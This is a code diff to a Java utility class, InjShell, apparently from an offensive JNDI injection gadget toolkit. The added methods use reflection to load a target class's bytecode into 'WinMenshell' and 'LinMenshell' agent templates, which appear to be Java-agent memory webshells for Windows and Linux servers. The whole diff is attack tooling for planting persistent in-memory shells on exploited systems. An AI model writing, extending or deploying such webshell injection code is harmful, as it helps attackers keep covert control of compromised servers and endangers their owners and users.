@@ -1,7 +1,10 @@
 package com.nu1r.jndi.gadgets.utils;
 
+import com.nu1r.jndi.template.Agent.LinMenshell;
+import com.nu1r.jndi.template.Agent.WinMenshell;
 import javassist.*;
 
+import java.lang.reflect.Field;
 import java.util.Arrays;
 import java.util.List;
 
@@ -146,5 +149,55 @@ public class InjShell {
         } catch (javassist.NotFoundException ignored) {
         }
         ctClass.addField(CtField.make(fieldCode, ctClass));
+    }
+
+    public static String insertWinAgent(CtClass ctClass) throws Exception {
+        byte[] bytes        = ctClass.toBytecode();
+        String className    = ctClass.getName();
+        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
+        Field  WinClassName = ctClazz.getDeclaredField("className");
+        WinClassName.setAccessible(true);
+        WinClassName.set(ctClazz, className);
+        Field WinclassBody = ctClazz.getDeclaredField("classBody");
+        WinclassBody.setAccessible(true);
+        WinclassBody.set(ctClazz, bytes);
+        return WinMenshell.class.getName();
+    }
+
+    public static void TinsertWinAgent(CtClass ctClass) throws Exception {
+        byte[] bytes        = ctClass.toBytecode();
+        String className    = ctClass.getName();
+        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
+        Field  WinClassName = ctClazz.getDeclaredField("className");
+        WinClassName.setAccessible(true);
+        WinClassName.set(ctClazz, className);
+        Field WinclassBody = ctClazz.getDeclaredField("classBody");
+        WinclassBody.setAccessible(true);
+        WinclassBody.set(ctClazz, bytes);
+    }
+
+    public static String insertLinAgent(CtClass ctClass) throws Exception {
+        byte[] bytes        = ctClass.toBytecode();
+        String className    = ctClass.getName();
+        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
+        Field  LinClassName = ctClazz.getDeclaredField("className");
+        LinClassName.setAccessible(true);
+        LinClassName.set(ctClazz, className);
+        Field LinclassBody = ctClazz.getDeclaredField("classBody");
+        LinclassBody.setAccessible(true);
+        LinclassBody.set(ctClazz, bytes);
+        return LinMenshell.class.getName();
+    }
+
+    public static void TinsertLinAgent(CtClass ctClass) throws Exception {
+        byte[] bytes        = ctClass.toBytecode();
+        String className    = ctClass.getName();
+        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
+        Field  LinClassName = ctClazz.getDeclaredField("className");
+        LinClassName.setAccessible(true);
+        LinClassName.set(ctClazz, className);
+        Field LinclassBody = ctClazz.getDeclaredField("classBody");
+        LinclassBody.setAccessible(true);
+        LinclassBody.set(ctClazz, bytes);
     }
 }
